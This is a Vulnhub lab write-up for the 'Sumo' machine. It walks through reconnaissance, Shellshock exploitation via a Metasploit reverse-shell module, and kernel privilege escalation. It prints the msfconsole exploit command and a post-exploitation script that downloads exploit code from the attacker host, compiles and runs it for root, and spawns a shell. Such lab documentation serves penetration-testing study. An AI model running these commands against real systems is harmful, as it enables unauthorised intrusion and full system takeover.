# Vulnhub Writeup #5: Sumo
## MITRE Att&ck Overview
---
![](2021-10-28-01-58-47.png)
MITRE ATT&CK matrix made with [Mitre-Attack-Navigator](https://mitre-attack.github.io/attack-navigator)

## Reconnaissance
--------------------------
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Procedure
#### T1594 - Search Victim owned Websites
- Used ZAP and crawled host's port 80 HTTP server; found nothing of note.
- Gobuster
  - Didn't get 200s for pages other than index.html with Seclists Discovery Wordlists
  - After having success with Nikto, wrote a script at  [Reconnaissance](Reconnaissance) which was able to identify this folder, as well as a default "it works! file". 

   
#### T1595 - Active Scanning 
- Nikto 
  - Identified shellshock vulnerability on the target
  - Also identified a directory /cgi-bin/test, as well as a file test.sh
    - Didn't determine how to identify these files without Nikto
    - What method Nikto used to find them, but it may be related to mod_negotiate being in use on the Apache server
 #### Reconnaissance Summary
  - Nothing else was identified. Methods to identify the vulnerability appear to be
    1) Nikto
    2) Knowing that CGI is extremely vulnerable
- No other write-ups I've found have illustrated anything other than Nikto or pure deduction based on the presence of CGI to find this vector.

## Initial Access, Execution & Command and Control
--------
### Procedure
1. Scanned for shellshock vulnerabilities in MSF 
   - command ```search shellshock```.  
   - ```apache_mod_cgi_bash_env_exec```  was returned as an applicable MSF module.
3. Deliver payload via MSF

```
msfconsole -x "use exploit/multi/http apache_mod_cgi_bash_env_exec;\
set PAYLOAD payload/linux/x86/shell_reverse_tcp;\
set TARGETURI /cgi-bin/test/test.cgi;\
set RHOST 172.16.2.44;\
set LPORT 4444;\
set CVE CVE-2014-6278;\
exploit -z"
   ```


## Discovery > Collection > Exfiltration
--------
### Procedure
1. Checked running processes with ps -aux. Didn't find anything noteworthy. 
2. Checked home directory and served Apache directory /var/www/html, finding nothing 
3. Checked listening connections which didn't find anything noteworthy. 
4. Checked distro/kernel version and compared it against searchsploit, which turned up an exploit

## Privilege Escalation
--------
### Procedure
1. Identify victim's kernel version as vulnerable to LPE (source: SearchSploit)
```searchsploit ubuntu |grep 3.2.0-23 |grep -vi \< 3.2.0-23 ```

2. Compile as pwn.c and serve via http
3. Use the ```-s``` flag to run sumo_post.sh script over the ssh session  
```sessions -i 1 -s /home/kali/targetz/sumo/sumo_post.sh"```
### Notes
**sumo_post.sh**
```bash
#!/bin/bash
##### sumo_post.sh - privilege escalation script
cd /tmp
R="172.16.2.45"
wget $R/pwn.c #priv esc exploit
chmod +x pwn.c
# fix path, gcc can't see ld binary from tmp 
export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
/usr/bin/gcc pwn.c -O2 -o vnik
./vnik 0  # results in root shell
python -c 'import pty; pty.spawn("/bin/sh")'
```


## Appendix: 
---
### Key lessons learned:
- Looking only for 200s in gobuster caused me to miss CGI-Bin dir. 
- Not enabling recursion in your automations can make enumeration a pain
- No straight lines found to discovering CGI vulnerability outside Nikto or Apache-CGI expertise
- Modify shell path early on to avoid "missing" binaries with ```export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin```
---
### Technical Issues Encountered:
GCC compliation error:
 
``` 
collect2: cannot find 'ld' when compiling in /tmp/
```

Found solution at  [stackoverflow](https://stackoverflow.com/questions/35970824/gcc-collect2-fatal-error-cannot-find-ld):

Two Options:
1) modify path
eg. export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin 

 2) copy ld binary to tmp


Obsidian Tags

#vulnhub #linux